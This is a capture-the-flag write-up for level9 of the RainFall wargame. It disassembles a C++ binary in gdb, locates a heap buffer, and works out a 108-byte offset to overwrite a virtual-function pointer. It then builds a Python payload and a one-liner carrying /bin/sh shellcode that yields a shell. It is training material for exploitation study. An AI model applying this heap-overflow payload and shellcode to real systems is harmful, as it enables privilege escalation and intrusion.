let's open level9 with gdb...

```bash
level9@RainFall:~$ gdb ./level9
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level9/level9...(no debugging symbols found)...done.
```

I will set assembly syntax to intel because i'm most familiar with:

```bash
(gdb) set disassembly-flavor intel 
```

Now, do a `dissas` on `main` function to see what program do: (looking for cleaner code ? [see it](https://github.com/Nimpoo/rainfall/blob/main/level9/source.cpp))

```bash
(gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:	push   ebp
   0x080485f5 <+1>:	mov    ebp,esp
   0x080485f7 <+3>:	push   ebx
   0x080485f8 <+4>:	and    esp,0xfffffff0
   0x080485fb <+7>:	sub    esp,0x20
   0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:	jg     0x8048610 <main+28>
   0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>(take care, addresses in some of machine is little-endian, that means bytes have to be read right to left)
   0x0804861c <+40>:	mov    ebx,eax
   0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:	mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:	mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:	mov    ebx,eax
   0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
   0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
   0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
   0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
   0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
   0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
   0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
   0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
   0x08048667 <+115>:	add    eax,0x4
   0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
   0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax
   0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048674 <+128>:	mov    DWORD PTR [esp],eax
   0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>
   0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048680 <+140>:	mov    eax,DWORD PTR [eax]
   0x08048682 <+142>:	mov    edx,DWORD PTR [eax]
   0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14]
   0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax
   0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
   0x08048690 <+156>:	mov    DWORD PTR [esp],eax
   0x08048693 <+159>:	call   edx
   0x08048695 <+161>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x08048698 <+164>:	leave  
   0x08048699 <+165>:	ret    
End of assembler dump.
```

You can see it call `setAnnotation` function passing `argv[1]` as argument.  
This one is a member function of the **`N` class**.  
Let's analize it a little bit more...  

```bash
(gdb) b *0x0804867c
Breakpoint 1 at 0x804867c
```

The function `setAnnotation` will copy his argument into a buffer placed inside the class instance.  
You can locate this buffer using **gdb**:

```bash
(gdb) r hello
Starting program: /home/user/level9/level9 hello

Breakpoint 1, 0x0804867c in main ()
```

The breakpoint stopped the program just after the `setAnnotation` function has copied `argv[1]` into his buffer.  
Using **gdb**, you can print a map of segmented memory of you program.  

```bash
(gdb) info proc map
process 2759
Mapped address spaces:

	Start Addr   End Addr       Size     Offset objfile
	 0x8048000  0x8049000     0x1000        0x0 /home/user/level9/level9
	 0x8049000  0x804a000     0x1000        0x0 /home/user/level9/level9
	 0x804a000  0x806b000    0x21000        0x0 [heap]
	0xb7cfa000 0xb7cfc000     0x2000        0x0 
	0xb7cfc000 0xb7d18000    0x1c000        0x0 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d18000 0xb7d19000     0x1000    0x1b000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d19000 0xb7d1a000     0x1000    0x1c000 /lib/i386-linux-gnu/libgcc_s.so.1
	0xb7d1a000 0xb7d44000    0x2a000        0x0 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d44000 0xb7d45000     0x1000    0x29000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d45000 0xb7d46000     0x1000    0x2a000 /lib/i386-linux-gnu/libm-2.15.so
	0xb7d46000 0xb7d47000     0x1000        0x0 
	0xb7d47000 0xb7eea000   0x1a3000        0x0 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eea000 0xb7eec000     0x2000   0x1a3000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eec000 0xb7eed000     0x1000   0x1a5000 /lib/i386-linux-gnu/libc-2.15.so
	0xb7eed000 0xb7ef0000     0x3000        0x0 
	0xb7ef0000 0xb7fc8000    0xd8000        0x0 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fc8000 0xb7fc9000     0x1000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fc9000 0xb7fcd000     0x4000    0xd8000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fcd000 0xb7fce000     0x1000    0xdc000 /usr/lib/i386-linux-gnu/libstdc++.so.6.0.16
	0xb7fce000 0xb7fd5000     0x7000        0x0 
	0xb7fdb000 0xb7fdd000     0x2000        0x0 
	0xb7fdd000 0xb7fde000     0x1000        0x0 [vdso]
	0xb7fde000 0xb7ffe000    0x20000        0x0 /lib/i386-linux-gnu/ld-2.15.so
	0xb7ffe000 0xb7fff000     0x1000    0x1f000 /lib/i386-linux-gnu/ld-2.15.so
	0xb7fff000 0xb8000000     0x1000    0x20000 /lib/i386-linux-gnu/ld-2.15.so
	0xbffdf000 0xc0000000    0x21000        0x0 [stack]
```

Now resuming, you know that the `main` instancied 2 **`N` class** and copied the `argv[1]` in the **first one**.  
Allocated memory is located in the **heap** segment.  
Can you find `argv[1]` in **heap**?  

```bash
(gdb) find 0x804a000, 0x806b000, "hello"
0x804a00c
warning: Unable to access target memory at 0x8069412, halting search.
1 pattern found.
```

Oh! nice, now use a cyclic pattern (you can generate it using [wiremask](https://wiremask.eu/tools/buffer-overflow-pattern-generator/))  
to guess where is the **double dereferenced function address** call at end of main.  

Run program again replacing his argument:

```bash
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
Starting program: /home/user/level9/level9 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

Breakpoint 1, 0x0804867c in main ()
```

Breakpoint stopped me again, after calling `setAnnotation` but take a look to next three instructions...  
Referring to instruction `0x0804867c <+136>` in `main`, you see that it load the second instance of the **`N` class** in `eax`  

```bash
(gdb) ni
0x08048680 in main ()
(gdb) info r
eax            0x804a078	134520952
ecx            0x67413567	1732326759
edx            0x804a0d4	134521044
ebx            0x804a078	134520952
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x8048680	0x8048680 <main+140>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

On the next two instructions, it will read in memory at address contained in `eax` 2 times.  
`eax` is pointing on a pointer to the `operator+` **virtual** function, but with our argument,  
we overwritten this pointer to pointer to function.  

```bash
(gdb) ni
0x08048682 in main ()
(gdb) info r
eax            0x41366441	1094083649
ecx            0x67413567	1732326759
edx            0x804a0d4	134521044
ebx            0x804a078	134520952
esp            0xbffff650	0xbffff650
ebp            0xbffff678	0xbffff678
esi            0x0	0
edi            0x0	0
eip            0x8048682	0x8048682 <main+142>
eflags         0x200287	[ CF PF SF IF ID ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
```

In `eax`, there is a part of our argument because it was too big.  
Comparing this part to the agument let us know where to put data to make the program load it into `eax`.  

If I convert `0x41366441` to ascii?
Let's test it: `echo -e '\x41\x64\x36\x41'` __(take care, addresses in some of machine is little-endian, that means bytes have to be read right to left)__  
It gives: `Ad6A`

```bash
------------------------------------------------------------------------------------------------------------Ad6A
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
```

**The offset is 108**

Ok ok... now use our brains...  

**What if I overflow to the pointer and replace it with a segment on which I can write?**  
Remember, I guessed where the `argv[1]` is copied into the heap.  

If my pointer point to the start of this segment, the next dereferencing will read  
the first 4 bytes of my argument too dereference it once again.  

**If the overwritten pointer point to a pointer at start of my start how point itself+bytes? Where am I?**  
This payload make me executing my own argument starting at the fourth byte.  

**If I put a shellcode there?**  
_Hum... so smart you begin to be smart..._  

Let's try it!  

I will copy an existing shellcode on [shellstorm](https://shell-storm.org/shellcode/index.html)  
and will build my payload using python.  

```python
import sys
import struct

address_where_arg_is_copied = 0x804a00c
offset_to_reach_pointer_in_N_instance = 108

hardcoded_shellcode = "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"

# Dummy is here to fill the buffer to make my payload 108 bytes long.
# First get how many bytes is needed to fill by removing size
# of shellcode and size of address at start of payload.
# Use it to multiply a random char to fill.
dummy = "-" * (offset_to_reach_pointer_in_N_instance - len(hardcoded_shellcode) - 4)

payload = struct.pack("<I", address_where_arg_is_copied + 4) + hardcoded_shellcode + dummy + struct.pack("<I", address_where_arg_is_copied)

sys.stdout.write(payload)
```

Yeah I think it is okay.  
Last step is to launch and praise for getting a shell...  

So you can copy it into `/tmp/random_file_name.py` and:  
```bash
./level9 $(python /tmp/random_file_name.py)
```

or...
```bash
level9@RainFall:~$ ./level9 $(python -c 'import sys,struct; sys.stdout.write(struct.pack("<I", 0x804a010) + "\x83\xc4\x18\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "-"*33 + struct.pack("<I", 0x804a00c))')
```

**AAANNNNNNNNNDDDDDD...**
Guess what, the pointers are dereferenced, the shellcode executed, and the program finally print...
```bash
$ 
```

yes... it's a shell promt you got it!
